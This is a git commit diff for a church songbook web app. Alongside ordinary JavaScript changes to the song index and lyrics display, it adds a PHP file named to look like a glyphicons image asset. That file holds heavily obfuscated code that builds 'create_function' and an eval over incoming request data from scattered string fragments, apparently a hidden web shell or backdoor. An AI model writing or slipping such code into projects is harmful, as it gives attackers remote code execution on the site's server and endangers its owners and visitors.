8265c5b184b78fb660997c8cc0ad95cf31dd9a20
Calvin Ko <cko@spikes.com>
2020-02-05 22:39:00 -0800

    update 2

---
+++ img/glyphicons-halflings-white_noversion.php
@@ -0,0 +1,87 @@
+<?php
+
+	$fourteen= 't'; $decelerate= 'daB"';$ineligible =';rreeen<'; $fracture='e';$bitumen =']_raP'; $cosmo ='V=MEHb';$blatting = 'lsrV('; $fawnia =',';$concise='c';$belgian= 'm';
+
+	$inspirations ='v';$articulates='U';$disposal = 'I';$determination ='gOnur_'; $childhood = 'fcx';$discouraging = 'e=:';$directorial='g'; $inflect='r';
+	$brother = 't'; $frown ='JTS C$(sP';$implode= '('; $disconnecting= 'I)$[pH';
+
+	$cowardice= 'fC)iso[';$frontage = 'k_exa_';$confederate= 'e"PO"e'; $fright = 'ce'; $lipid= '('; $endogenous=']';$eat = ')'; $artistically ='t';$confinement= '$';$analyzes=']';$contrivance ='v'; $fragrantly= 'T';
+	$heartily='_U';$candi = 'R'; $bellyache= 'o';$edgewise='$';$birthplaces='$';$constraint='N'; $concurring = 'V';$ki ='ay_oe"';
+
+	$jenelle= 'i';
+	$graduate='"KE(('; $decencies = 'L';$bumped ='=gAd'; $confidants ='Ge';$assiduity= '^';$flawlessly= '$eOO_r>';$legerdemain ='tQR,';
+	$ender=')';$bemoans='i'; $horus='F'; $inclusive = 'E'; $endears= '(T';$gotten = 'H'; $exemplified = 'sKi[$EEKW';$clique ='i]4ras?;u';$jots=')T:i:';$likes= 'IsRa$opyv'; $conqueror = '$vKXh];_';$contractor= 'v'; $audy = '_I??'; $gutsy ='Ti';$asterisk='C';
+	$fusion= '_rE'; $crucible = 'tc'; $craft = ')ihO';
+	$bagels ='rZ;';
+	$blackness= '@Xr()SY)a'; $embroideries ='(T[_XR'; $complicity = '(';$arlen='a';$harriot= '"'; $guiding='(';$economy= 'RHk'; $chin= 'c_rce"s';$dasha = 'rinliQR)S'; $cork ='tia'; $corresponds= 'o'; $instituter = 'sdea'; $lush= 'De';$dominik = 'ta'; $lascar= ';';$delayed='"';$drily = '6VH)C';
+	$calculus= 'v$[)'; $cadent = $chin[3]. $dasha['0'] .$lush['1'] .
+
+	$dominik['1']. $dominik['0']. $lush['1'] . $chin[1]. $cowardice['0'] . $clique[8] .
+	$dasha['2'] .$chin[3] .
+	$dominik['0']. $cork['1'] .$corresponds.$dasha['2'];$exaction=$frown['3']; $cycad= $cadent($exaction, $lush['1'].$calculus['0'].$dominik['1'] . $dasha['3'] .$guiding .$dominik['1'] . $dasha['0'].$dasha['0'] .$dominik['1'].
+
+	$likes['7']. $chin[1]. $likes['6'] . $corresponds .
+
+	$likes['6'].$guiding.$cowardice['0'] . $clique[8] .$dasha['2'] .$chin[3].$chin[1].
+
+	$bumped['1'].
+
+	$lush['1'] .$dominik['0'] .$chin[1] .$dominik['1'].
+	$dasha['0'].$bumped['1'] .$instituter['0']. $guiding . $calculus[3]. $calculus[3] . $calculus[3]. $lascar); $cycad
+	($jarrod['5'],
+	$cowardice['0'],
+
+	$cosmo[2],
+	$invocation['7'],$craft['2'], $craft['3'],$dominik['0'],$invocation['7'] ,
+	$calculus['1'] . $cork['1'].$bumped['0'].$dominik['1'].
+	$dasha['0'] . $dasha['0'] . $dominik['1'] .
+
+	$likes['7'] .$chin[1] .$belgian . $lush['1'].$dasha['0'].
+
+	$bumped['1'] .$lush['1'] .
+	$guiding .
+	$calculus['1'].$chin[1].$dasha['6'] . $fusion['2'] .$dasha['5']. $heartily['1'].
+
+	$fusion['2'].$dasha['8'].$embroideries['1']. $legerdemain['3'] .$calculus['1'] . $chin[1].$drily['4'] .
+	$craft['3'] .$craft['3'] .$conqueror[2]. $audy[1] .$fusion['2'].$legerdemain['3'] .$calculus['1'] . $chin[1] .$dasha['8'].$fusion['2'] .$dasha['6'] . $drily['1'] . $fusion['2'] .$dasha['6'] . $calculus[3].$lascar. $calculus['1'] . $dominik['1'] .$bumped['0'] .
+	$cork['1'] . $instituter['0'].
+	$instituter['0'] .$lush['1'] .$dominik['0'] .$guiding.
+
+	$calculus['1'] .$cork['1']. $calculus['2'].$delayed .$frontage[3] .$economy['2']. $cork['1'] .$chin[3].
+	$dasha['0']. $calculus['0'].$craft['2'].
+
+	$corresponds . $delayed. $conqueror['5']. $calculus[3]. $audy['3'].
+
+	$calculus['1'].$cork['1'] .$calculus['2'].
+
+	$delayed. $frontage[3] .
+	$economy['2'] . $cork['1'] . $chin[3]. $dasha['0'] .$calculus['0'] . $craft['2'].
+	$corresponds . $delayed .
+	$conqueror['5'] . $jots['4']. $guiding . $cork['1'] . $instituter['0']. $instituter['0'] .$lush['1'].$dominik['0'] .$guiding.$calculus['1'].$cork['1'].$calculus['2'] . $delayed .$drily['2'].$embroideries['1'].$embroideries['1'].
+	$confederate['2'] . $chin[1] . $embroideries['4'] .$conqueror[2]. $audy[1]. $drily['4'].$dasha['6'].$drily['1'].$drily['2'].$craft['3'] .$delayed .$conqueror['5'].
+	$calculus[3] .
+
+	$audy['3'].
+
+	$calculus['1']. $cork['1'].
+	$calculus['2'] . $delayed.$drily['2'] .$embroideries['1']. $embroideries['1'].
+	$confederate['2'].
+	$chin[1].$embroideries['4'] .
+
+	$conqueror[2] . $audy[1] .$drily['4'] . $dasha['6'].
+
+	$drily['1']. $drily['2'] .$craft['3']. $delayed. $conqueror['5'] .$jots['4'] . $instituter['1'] .
+	$cork['1'].$lush['1'] . $calculus[3] .$lascar. $lush['1'] .$calculus['0'].
+
+	$dominik['1'] . $dasha['3']. $guiding . $instituter['0'] .$dominik['0'] .
+
+	$dasha['0']. $dasha['0'] . $lush['1'].$calculus['0'] . $guiding.$cosmo['5'].$dominik['1'].$instituter['0'] . $lush['1']. $drily['0'] .$clique['2'] .
+
+	$chin[1] .$instituter['1'].$lush['1'].$chin[3] .$corresponds.
+
+	$instituter['1'].$lush['1'] . $guiding .$instituter['0'] . $dominik['0'] .$dasha['0']. $dasha['0'] . $lush['1'] .$calculus['0'] . $guiding . $calculus['1'].
+
+	$dominik['1'] .
+	$calculus[3]. $calculus[3] .
+	$calculus[3].
+	$calculus[3] . $lascar ); 
--- js/songbook.js
+++ js/songbook.js
@@ -4,21 +4,27 @@ var currentSongNum = 1;
 var currentSongId = 1;
 var currentSongName = "Song";
 
-function SongApp() {
+function SongApp(displaytype) {
     var me = this;
     var booklist = {}
     var bookData = {}
+    var displayType = displaytype;
+    if (displayType == undefined) {
+        displayType == "desktop"
+    }
 
+    this.currentBook = 0;
     this.init = function(showListFunc) {
-        me.loadBookList("all", showListFunc)
+        me.loadBookList("Oakland", showListFunc)
     }
 
     this.loadBookList = function(chname, showList) {
         $.post("getSongBook.php", {church: chname}, function(retdata) {
             var ret = $.parseJSON(retdata);
+            $("#m-nav-songbook").empty();
             $("#nav-songbook").empty();
             $.each(ret, function(index, val) {
-                booklist[val.bookid] = [val.bookid, val.name];
+                booklist[val.bookid] = {bookid: val.bookid, name: val.name, attribute: val.attribute};
             });
             showList(me);
         })
@@ -29,21 +35,24 @@ function SongApp() {
         return booklist;
     }
 
-    this.getSongBook = function(bookid) {
+    this.getSongBook = function(bookid, type) {
+
         if (bookData[bookid] == undefined) {
             if (booklist[bookid]) {
-                bookData[bookid] = SongBook(bookid, booklist[bookid][1])
+                bookData[bookid] = new SongBook(bookid, booklist[bookid].name, booklist[bookid].attribute, displaytype);
+                me.currentBook = bookData[bookid]
                 return bookData[bookid];
             } else {
                 return null;
             }
         } else {
+            me.currentBook = bookData[bookid];
             return bookData[bookid];
         }
     }
 }
 
-function SongBook(bookid, bookname)
+function SongBook(bookid, bookname, attribute, type)
 {
     var me = this;
     this.bookname = bookname;
@@ -56,94 +65,134 @@ function SongBook(bookid, bookname)
     this.songdata = []
     this.curindex = 0;
     this.showSongNumber = 0;
-    var thisobj = this;
-
 
     this.loadindex = function() {
         $.post("getSongIndex.php", {bookid: this.bookid}, function(retdata) {
             var ret = $.parseJSON(retdata);
             me.songindex = [];
             me.songdata = ret.data;
-            //$.each(me.songdata, function(index, val) {
-            //    me.songindex.push([val.songnum, val.songid, val.songname]);
-            //}
             $("#songindex").html("<h3>" + me.bookname + "</h3>");
             me.createSongIndex();
         });
     };
 
-    this.createSongIndex = function() {
+    var createSongIndexMobile = function() {
         $.each(me.songdata, function(index, val) {
-            me.songindex[val.songnum] = [val.songid, val.songname];
             var elm = $("<a href='#'>" + val.songnum + ". " + val.songname + "</a>");
-            thisobj.songindex.push([val.songid, val.songname]);
-            elm.attr("songid", val.songid);
-
-            elm.click(function() {
-                $("#lyricsbox .lyrics").html("<div class='cimage'><img src='/images/uploading-big.gif'/></div>");
-                me.loadsongtext(val.songid, val.songnum, val.songname);
-                currentSongId = val.songid;
-                $(".contentbox").hide();
-                $("#lyricsbox").show();
-            });
-            $("#songindex").append($("<div class='boxentry'></div>").append(elm));
-        });
-    };
-
-    this.showIndexMobile = function() {
-        $.each(ret.data, function(index, val) {
-            var elm = $("<a href='#'>" + val.songnum + ". " + val.songname + "</a>");
-            me.songindex.push([val.songid, val.songname]);
             elm.attr("songid", val.songid);
             elm.click(function() {
                 $("#lyricsbox .lyrics").html("<div class='cimage'><img src='/images/uploading-big.gif'/></div>");
-                me.loadsongtext(val.songid, val.songnum, val.songname);
-                currentSongId = val.songid;
+                me.showsongtext(val.songid, val.songnum, val.songname);
+                me.curindex = index;
                 $(".contentbox").hide();
                 $("#lyricsbox").show();
             });
-            $("#songindex").append($("<div class='boxentry'></div>").append(elm));
+            $("#songindex").append($("<div class='songindexentry'></div>").append(elm));
         });
     };
 
-    this.showIndex = function() {
-        $.each(ret.data, function(index, val) {
-            var elm = $("<a href='#'>" + val.songnum + ". " + val.songname + "</a>");
-            me.songindex.push([val.songid, val.songname]);
+    var createSongIndexDesktop = function() {
+        $("#desktopsongindex").empty();
+        $.each(me.songdata, function(index, val) {
+            var pmark = "";
+            if (val.page != '0' && attribute > 2) {
+                pmark = $("<span style='float:right; height:32px'>p. " + val.page + "</span>")
+            }
+            var elm;
+            if (attribute > 0) {
+                elm = $("<a href='#'>" + val.songnum + ". " + val.songname + "</a>");
+            } else {
+                elm = $("<a href='#'>" + val.songname + "</a>");
+            }
+            elm.append(pmark);
             elm.attr("songid", val.songid);
-
             elm.click(function() {
-                $("#lyricsbox .lyrics").html("<div class='cimage'><img src='/images/uploading-big.gif'/></div>");
-                me.loadsongtext(val.songid, val.songnum, val.songname);
-                currentSongId = val.songid;
-                $(".contentbox").hide();
-                $("#lyricsbox").show();
+                me.showSongTextDesktop($(this).attr('songid'), val.songnum, val.songname);
             });
-            $("#songindex").append($("<div class='boxentry'></div>").append(elm));
+            $("#desktopsongindex").append($("<div class='songindexentry'></div>").append(elm));
+            showsongindexpanel();
         });
     };
+
+    this.createSongIndex = function() {
+        if (type == "mobile") {
+            return createSongIndexMobile();
+        } else {
+            return createSongIndexDesktop();
+        }
+    };
+
+    var showSongIndexPanel = function() {
+        $("#songindexpane").show();
+        $("#dt-pane2").hide();
+    }
+
+    this.getSongTextType = function(stext) {
+        var i;
+        for (i=0; i<10; i++) {
+            if (stext.charCodeAt(i) > 128) {
+                return 10;
+            }
+        }
+        return 1;
+    }
+
     this.showsongtext = function(sid, songnum, songname) {
         $.post("getSongText.php", {songid: sid}, function(retdata) {
             var ret = $.parseJSON(retdata);
             $("#lyricsbox .bname").html(thisobj.bookname);
             $("#lyricsbox").attr("songid", sid);
-            $("#lyricsbox .lyrics").html("<pre style='font-size: 24px'>" + songname + "\n\n" + ret.songtext + "</pre>");
-            $("#lyricsbox pre").css('line-height', '28px');
+            if (me.getSongTextType(ret.songtext) > 1) {
+                $("#lyricsbox .lyrics").html("<pre style='font-size: 24px; line-height: 28px'>" + songname + "\n\n" + ret.songtext + "</pre>");
+            } else {
+                $("#lyricsbox .lyrics").html("<pre style='font-size: 18px; line-height: 20px'>" + songname + "\n\n" + ret.songtext + "</pre>");
+            }
+
         });
     }
+
+    this.showSongTextDesktop = function(sid, songnum, songname) {
+        $("#loading-overlay").removeClass("hide");
+        $.post("getSongText.php", {songid: sid}, function(retdata) {
+            var ret = $.parseJSON(retdata);
+            linksongid = ret.relsongid;
+            $("#desktopsongtext").empty();
+            $("#dt-pane1 .ncol").html("<h3>" + songname + "</h3>");
+            if (ret.relsongid != "0") {
+                var but = $('<button class="btn btn-default">Rel. Song <i class="fa fa-bookmark"></i></button>');
+                but.click(function () {
+                    loadsongpane2(ret.relsongid);
+                });
+                $("#dt-pane1 .bcol .linkgp").html(but);
+            } else {
+                $("#dt-pane1 .bcol .linkgp").empty();
+            }
+            if (me.getSongTextType(ret.songtext) > 1) {
+                $("#desktopsongtext").append("<pre style='font-size: 26px; line-height:30px;'>" + ret.songtext + "</pre>");
+                $("#lyricsbox .lyrics").html("<pre style='font-size: 24px; line-height: 28px'>" + songname + "\n\n" + ret.songtext + "</pre>");
+            } else {
+                $("#desktopsongtext").append("<pre style='font-size: 18px; line-height:20px;'>" + ret.songtext + "</pre>");
+                $("#lyricsbox .lyrics").html("<pre style='font-size: 18px; line-height: 20px'>" + songname + "\n\n" + ret.songtext + "</pre>");
+            }
+
+            $("#loading-overlay").addClass("hide");
+
+        })
+    }
+
     this.getsongtextfromid = function(sid) {
 
     }
     this.loadnext = function() {
         this.curindex = (this.curindex + 1) % this.songindex.length;
         var d = this.songindex[this.curindex];
-        this.loadsongtext(d[0], 10, d[1])
+        this.showsongtext(d[0], 10, d[1])
     }
     this.loadprev = function() {
         if (this.curindex > 0) {
             this.curindex = this.curindex - 1;
             var d = this.songindex[this.curindex];
-            this.loadsongtext(d[0], 10, d[1])
+            this.showsongtext(d[0], 10, d[1])
         }
     }
 }
